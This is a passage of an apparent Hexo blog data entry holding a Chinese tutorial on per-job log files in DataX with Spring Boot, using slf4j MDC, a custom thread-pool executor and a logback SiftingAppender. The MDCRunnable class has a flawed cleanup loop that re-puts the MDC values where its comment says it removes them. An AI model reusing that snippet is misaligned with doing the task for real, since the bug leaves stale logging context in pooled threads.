MDC.put(entry.getKey(), entry.getValue());\n        }\n    }\n}\n\n```\n通过上述对线程池进行改造，在线程池每次获取任务的时候，都可以从父线程获取父线程设置的变量。因此我们要在父线程启动子线程的时候，设置上这个变量。\n```java\nMDC.put(\"jobId\", String.valueOf(jobId));\n\n```\n\n接下来，我们需要配置下logback.xml\n```xml\n\n    <appender name=\"siftInfo\" class=\"ch.qos.logback.classic.sift.SiftingAppender\">\n        <!--discriminator鉴别器，设置运行时动态属性,siftingAppender根据这个属性来输出日志到不同文件 -->\n        <discriminator>\n            <key>jobId</key>\n            <defaultValue>unknown</defaultValue>\n        </discriminator>\n        <sift>\n            <!--具体的写日志appender，每一个userId创建一个文件-->\n            <appender name=\"${jobId}\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\n                <append>true</append>\n                <encoder charset=\"UTF-8\">\n                    <pattern>%d{yyyy-MM-dd HH:mm:ss} %level %logger{36} - %msg%n</pattern>\n                </encoder>\n\n                <file>${logdir}/job/${jobId}.log</file>\n                <rollingPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\">\n                    <!--定义文件滚动时的文件名的格式-->\n                    <fileNamePattern>./logs/job/%d{yyyyMMdd}/${jobId}-%i.log</fileNamePattern>\n                    <maxFileSize>500MB</maxFileSize>\n                    <maxHistory>60</maxHistory>\n                    <totalSizeCap>20GB</totalSizeCap>\n                </rollingPolicy>\n\n                <filter class=\"ch.qos.logback.classic.filter.ThresholdFilter\">\n                    <level>INFO</level>\n                </filter>\n            </appender>\n        </sift>\n    </appender>\n\n```\n","slug":"datax集成spring-boot实现每个job的日志打印到不同文件","published":1,"updated":"2022-03-20T10:31:37.350Z","_id":"cl0z4fvae00008i726ozp0uei","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"问题背景\"><a href=\"#问题背景\" class=\"headerlink\" title=\"问题背景\"></a>问题背景</h3><p>1.当我们的程序开启了多个线程进行作业的时候，如何把跟一个作业相关的日志都打印到一个文件呢，而不是都打印在一个文件里，毕竟都打印在一个文件里，很不方便我们日常去查看问题。</p>\n<p>2.经过调研发现slfj的MDC就可以实现这个功能，原理就是通过threalocal去实现的，感兴趣的可以去查看源码。</p>\n<h3 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h3><p>1.具体怎么使用也很简单，我们需要在datax的线程池执行任务的时候，能够获取到启动这个线程池传递过来的jobId就可以了，具体代码如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.alibaba.datax.core.util;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.slf4j.MDC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MDCThreadPoolExecutor</span> <span class=\"keyword\">extends</span> <span class=\"title\">ThreadPoolExecutor</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(Runnable command)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Map&lt;String, String&gt; context = MDC.getCopyOfContextMap();</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.execute(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 将父线程的MDC内容传给子线程</span></span><br><span class=\"line\">                MDC.setContextMap(context);</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 执行异步操作</span></span><br><span class=\"line\">                    command.run();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 清空MDC内容</span></span><br><span class=\"line\">                    MDC.clear();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.alibaba.datax.core.util;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.slf4j.MDC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MDCRunnable</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Runnable runnable;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 保存当前主线程的MDC值</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, String&gt; mainMdcMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCRunnable</span><span class=\"params\">(Runnable runnable)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.runnable = runnable;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mainMdcMap = MDC.getCopyOfContextMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 将父线程的MDC值赋给子线程</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Map.Entry&lt;String, String&gt; entry : mainMdcMap.entrySet()) &#123;</span><br><span class=\"line\">            MDC.put(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 执行被装饰的线程run方法</span></span><br><span class=\"line\">        runnable.run();</span><br><span class=\"line\">        <span class=\"comment\">// 执行结束移除MDC值</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Map.Entry&lt;String, String&gt; entry : mainMdcMap.entrySet()) &#123;</span><br><span class=\"line\">            MDC.put(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述对线程池进行改造，在线程池每次获取任务的时候，都可以从父线程获取父线程设置的变量。因此我们要在父线程启动子线程的时候，设置上这个变量。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MDC.put(<span class=\"string\">\"jobId\"</span>, String.valueOf(jobId));</span><br></pre></td></tr></table></figure>\n\n<p>接下来，我们需要配置下logback.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">appender</span> <span class=\"attr\">name</span>=<span class=\"string\">\"siftInfo\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.classic.sift.SiftingAppender\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--discriminator鉴别器，设置运行时动态属性,siftingAppender根据这个属性来输出日志到不同文件 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">discriminator</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>jobId<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">defaultValue</span>&gt;</span>unknown<span class=\"tag\">&lt;/<span class=\"name\">defaultValue</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">discriminator</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">sift</span>&gt;</span></span><br><span class=\"line\">        <span class=\"comment\">&lt;!--具体的写日志appender，每一个userId创建一个文件--&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">appender</span> <span class=\"attr\">name</span>=<span class=\"string\">\"$&#123;jobId&#125;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.core.rolling.RollingFileAppender\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">append</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">append</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">encoder</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss&#125; %level %logger&#123;36&#125; - %msg%n<span class=\"tag\">&lt;/<span class=\"name\">pattern</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">encoder</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">file</span>&gt;</span>$&#123;logdir&#125;/job/$&#123;jobId&#125;.log<span class=\"tag\">&lt;/<span class=\"name\">file</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rollingPolicy</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"comment\">&lt;!--定义文件滚动时的文件名的格式--&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">fileNamePattern</span>&gt;</span>./logs/job/%d&#123;yyyyMMdd&#125;/$&#123;jobId&#125;-%i.log<span class=\"tag\">&lt;/<span class=\"name\">fileNamePattern</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">maxFileSize</span>&gt;</span>500MB<span class=\"tag\">&lt;/<span class=\"name\">maxFileSize</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">maxHistory</span>&gt;</span>60<span class=\"tag\">&lt;/<span class=\"name\">maxHistory</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">totalSizeCap</span>&gt;</span>20GB<span class=\"tag\">&lt;/<span class=\"name\">totalSizeCap</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">rollingPolicy</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filter</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.classic.filter.ThresholdFilter\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">level</span>&gt;</span>INFO<span class=\"tag\">&lt;/<span class=\"name\">level</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">appender</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">sift</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">appender</span>&gt;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"问题背景\"><a href=\"#问题背景\" class=\"headerlink\" title=\"问题背景\"></a>问题背景</h3><p>1.当我们的程序开启了多个线程进行作业的时候，如何把跟一个作业相关的日志都打印到一个文件呢，而不是都打印在一个文件里，毕竟都打印在一个文件里，很不方便我们日常去查看问题。</p>\n<p>2.经过调研发现slfj的MDC就可以实现这个功能，原理就是通过threalocal去实现的，感兴趣的可以去查看源码。</p>\n<h3 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h3><p>1.具体怎么使用也很简单，我们需要在datax的线程池执行任务的时候，能够获取到启动这个线程池传递过来的jobId就可以了，具体代码如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.alibaba.datax.core.util;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.slf4j.MDC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MDCThreadPoolExecutor</span> <span class=\"keyword\">extends</span> <span class=\"title\">ThreadPoolExecutor</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCThreadPoolExecutor</span><span class=\"params\">(<span class=\"keyword\">int</span> corePoolSize, <span class=\"keyword\">int</span> maximumPoolSize, <span class=\"keyword\">long</span> keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(Runnable command)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> Map&lt;String, String&gt; context = MDC.getCopyOfContextMap();</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.execute(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 将父线程的MDC内容传给子线程</span></span><br><span class=\"line\">                MDC.setContextMap(context);</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 执行异步操作</span></span><br><span class=\"line\">                    command.run();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 清空MDC内容</span></span><br><span class=\"line\">                    MDC.clear();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.alibaba.datax.core.util;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.slf4j.MDC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MDCRunnable</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Runnable runnable;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 保存当前主线程的MDC值</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, String&gt; mainMdcMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MDCRunnable</span><span class=\"params\">(Runnable runnable)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.runnable = runnable;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mainMdcMap = MDC.getCopyOfContextMap();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 将父线程的MDC值赋给子线程</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Map.Entry&lt;String, String&gt; entry : mainMdcMap.entrySet()) &#123;</span><br><span class=\"line\">            MDC.put(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 执行被装饰的线程run方法</span></span><br><span class=\"line\">        runnable.run();</span><br><span class=\"line\">        <span class=\"comment\">// 执行结束移除MDC值</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Map.Entry&lt;String, String&gt; entry : mainMdcMap.entrySet()) &#123;</span><br><span class=\"line\">            MDC.put(entry.getKey(), entry.getValue());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述对线程池进行改造，在线程池每次获取任务的时候，都可以从父线程获取父线程设置的变量。因此我们要在父线程启动子线程的时候，设置上这个变量。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MDC.put(<span class=\"string\">\"jobId\"</span>, String.valueOf(jobId));</span><br></pre></td></tr></table></figure>\n\n<p>接下来，我们需要配置下logback.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">appender</span> <span class=\"attr\">name</span>=<span class=\"string\">\"siftInfo\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"ch.qos.logback.classic.sift.SiftingAppender\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--discriminator鉴别器，设置运行时动态属性,siftingAppender根据这个属性来输出日志到不同文件 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">discriminator</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">key</span>&gt;</span>jobId<span class=\"tag\">&lt;/<span class=\"name\">key</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span 